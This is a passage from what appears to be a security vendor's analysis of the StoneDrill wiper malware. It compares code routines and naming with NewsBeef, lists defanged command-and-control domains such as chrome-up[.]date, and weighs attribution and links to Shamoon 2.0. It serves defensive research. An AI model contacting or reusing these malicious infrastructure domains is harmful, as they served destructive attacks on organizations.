8F 44 24 10 8B 44 24 10 33 D2 2B 44 24 14 B9 80 96 98 00 F7 F1 2C 02 A2 61 D6 64 002.9.2. The OS commandIn NewsBeef:In StoneDrill:In StoneDrill2.9.3. The Update commandIn NewsBeef:In StoneDrill:2.9.4. The Strings Decryption routineIn NewsBeef:In StoneDrill:2.9.5. The Payload WinmainIn NewsBeef:In StoneDrill:2.9.6. Command center name similaritiesBesides the technical code similarities listed above, we noticed that the naming scheme for the NewsBeef and StoneDrill C&Cs is quite similar. For instance:StoneDrillNewsBeefwww.chromup[.]comwww.chrome-up[.]date service1.chrome-up[.]date service.chrome-up[.]datewww.eservic[.]comwww.serveirc[.]com3. ConclusionsOur discovery of StoneDrill gives another dimension to the existing wave of wiper attacks against Saudi organizations that started with Shamoon 2.0 in November 2016. Compared to the new Shamoon 2.0 variants, the most significant difference is the lack of a disk driver used for direct access during the destructive step. Nevertheless, one does not necessarily need raw disk access to perform destructive functions at file level, which the malware implements quite successfully.Of course, one of the most important questions here is the connection between Shamoon and StoneDrill. Both wipers appear to have been used against Saudi organizations during a similar timeframe of October-November 2016. Several theories are possible here:● StoneDrill is a less-used wiper tool, deployed in certain situations by the same Shamoongroup.● StoneDrill and Shamoon are used by different groups which are aligned in their interests. ● StoneDrill and Shamoon are used by two different groups which have no connection toeach other and just happen to target Saudi organizations at the same time.Taking all factors into account, our opinion is that the most likely theory is the second.Additionally, StoneDrill appears to be connected with previously reported NewsBeef activity, which continues to target Saudi organizations. From this point of view, NewsBeef and StoneDrill appear to be continuously focused on targeting Saudi interests, while Shamoon is a flashy, come-and-go high impact tool.In terms of attribution, while Shamoon embeds Arabic-Yemen resource language sections, StoneDrill embeds mostly Persian resource language sections. Geopolitical analysts would be quick to point out that Iran and Yemen are both players in the Iran-Saudi Arabia proxy conflict. Of course, we do not exclude the possibility of false flags.Finally, many unanswered question remain in regards to StoneDrill and NewsBeef. The discovery of the StoneDrill wiper in Europe is a significant sign that the group is expanding its destructive attacks outside the Middle East. The target for the attack appears to be a large corporation with a wide area of activity in the petro-chemical sector, with no apparent connection or interest in Saudi Arabia.As usual, we will continue to monitor the Shamoon, StoneDrill and NewsBeef attacks. A presentation about StoneDrill will be given at the Kaspersky Security Analyst Summit 